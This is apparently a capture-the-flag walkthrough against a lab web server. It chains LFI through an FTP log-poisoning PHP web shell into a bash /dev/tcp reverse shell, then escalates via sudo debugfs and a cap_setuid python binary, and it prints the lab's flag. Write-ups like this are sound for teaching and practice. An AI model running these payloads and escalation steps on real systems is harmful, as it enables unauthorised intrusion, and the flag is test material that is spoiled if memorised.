# IP
172.17.0.2
# Recognition
```sh
ping -c 2 172.17.0.2

PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.060 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.044 ms
```
# Ports scanning
```sh
sudo nmap -sS -sV -sC 172.17.0.2

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    Apache httpd 2.4.68 ((Debian))
|_http-server-header: Apache/2.4.68 (Debian)
|_http-title: Hannah's Coffee
MAC Address: 2A:B9:97:C3:F2:DB (Unknown)
Service Info: OS: Unix
```
# Dir Fuzzing
```sh
dirb http://172.17.0.2 /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Sep 14 14:42:58 2026
URL_BASE: http://172.17.0.2:80/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://172.17.0.2:80/ ----
+ http://172.17.0.2:80/index.php (CODE:200|SIZE:963)
==> DIRECTORY: http://172.17.0.2:80/pages/
+ http://172.17.0.2:80/server-status (CODE:403|SIZE:315)

---- Entering directory: http://172.17.0.2:80/pages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Mon Sep 14 14:42:59 2026
DOWNLOADED: 4612 - FOUND: 2
```

# Explore the web
## /pages
![[Pasted image 20260914145321.png]]

**vuln:** If we could somehow upload a payload.php we could execute it from this page.
## /contact
We could obtain an username to use in ftp login

```sh
curl http://172.17.0.2/index.php?page=contact
```

``` html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hannah's Coffee</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header class="navbar">
        <h1>☕ Hannah's Coffee</h1>
        <nav>
            <a href="index.php?page=home">Home</a>
            <a href="index.php?page=menu">Menu</a>
            <a href="index.php?page=about">About</a>
            <a href="index.php?page=contact">Contact</a>
        </nav>
    </header>
    <main class="content">
        <section class="contact">
    <h2>Contact Us</h2>
    <p>Email: hello@hannahscoffee.local</p>
    <p>Address: 12 Coffee Bliss Street</p>
</section>
    </main>
    <footer>
        <p>&copy; 2026 Hannah's Coffee. All rights reserved.</p>
    </footer>
</body>
</html>
```

##  ?page=
We could find a parameter to try LFI
# Hidden Parameters Fuzzing
```sh
ffuf -u "http://172.17.0.2/index.php?FUZZ=test" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 198

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/index.php?FUZZ=test
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 198
________________________________________________

studio                  [Status: 200, Size: 637, Words: 145, Lines: 25, Duration: 0ms]
:: Progress: [19966/19966] :: Job [1/1] :: 109 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
# LFI
```sh
curl -s "http://172.17.0.2/index.php?studio=../../../etc/passwd"
```
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hannah's Coffee</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header class="navbar">
        <h1>☕ Hannah's Coffee</h1>
        <nav>
            <a href="index.php?page=home">Home</a>
            <a href="index.php?page=menu">Menu</a>
            <a href="index.php?page=about">About</a>
            <a href="index.php?page=contact">Contact</a>
        </nav>
    </header>
    <main class="content">
        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
Debian-exim:x:100:101::/var/spool/exim4:/usr/sbin/nologin
messagebus:x:995:995:System Message Bus:/nonexistent:/usr/sbin/nologin
ftp:x:101:103:ftp daemon:/srv/ftp:/usr/sbin/nologin
hannahftp:x:1000:1000::/home/hannahftp:/bin/sh
hannah:x:1001:1001::/home/hannah:/bin/bash
    </main>
    <footer>
        <p>&copy; 2026 Hannah's Coffee. All rights reserved.</p>
    </footer>
</body>
</html>
```
# Log poisoning
```sh
ftp 172.17.0.2

Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:codebylauti): <?php system($_GET['cmd']); ?>
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp>
```

```sh
curl -s "http://172.17.0.2/index.php?studio=../../../var/log/vsftpd.log&cmd=id"

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hannah's Coffee</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header class="navbar">
        <h1>☕ Hannah's Coffee</h1>
        <nav>
            <a href="index.php?page=home">Home</a>
            <a href="index.php?page=menu">Menu</a>
            <a href="index.php?page=about">About</a>
            <a href="index.php?page=contact">Contact</a>
        </nav>
    </header>
    <main class="content">
        Mon Sep 14 19:37:20 2026 [pid 17] CONNECT: Client "172.17.0.1"
Mon Sep 14 19:37:30 2026 [pid 16] [uid=33(www-data) gid=33(www-data) groups=33(www-data)
] FAIL LOGIN: Client "172.17.0.1"
    </main>
    <footer>
        <p>&copy; 2026 Hannah's Coffee. All rights reserved.</p>
    </footer>
</body>
</html>
```
# Reverse Shell
```sh
curl -s "http://172.17.0.2/index.php?studio=../../../var/log/vsftpd.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F4444%200%3E%261%27"
```
# Proper shell
```sh
www-data@c4cfcaaf4ea1:/var/www/html$ python3 -c "import pty; pty.spawn("/bin/bash")
<tml$ python3 -c "import pty; pty.spawn("/bin/bash")
> ^Z
zsh: suspended  sudo nc -lvnp 4444

┌──(codebylauti㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  sudo nc -lvnp 4444
                                    export TERM=xterm
									export SHELL=bash
```
# Privilege Escalation
## To hannah
```sh
sudo -l
Matching Defaults entries for www-data on c4cfcaaf4ea1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on c4cfcaaf4ea1:
    (hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img
```

```sh
sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
```

```sh
debugfs:  cat hannah_secret.txt
G'2'ZkcHsulI*vE+D,
```

````sh
debugfs:  !/bin/bash
hannah@c4cfcaaf4ea1:/home$ whoami
hannah
`````
## To root
```sh
cat user.txt
dl{user_eedfcf739a076a72412c89a1354a4119}
```

```sh
hannah@c4cfcaaf4ea1:/$ getcap -r / 2>/dev/null
/opt/priv-python cap_setuid=ep
```

```sh
hannah@c4cfcaaf4ea1:/$ /opt/priv-python
Python 3.13.5 (main, Jul 15 2026, 20:25:40) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os; os.setuid(0); os.execl("/bin/sh", "sh")
# whoami
root
```
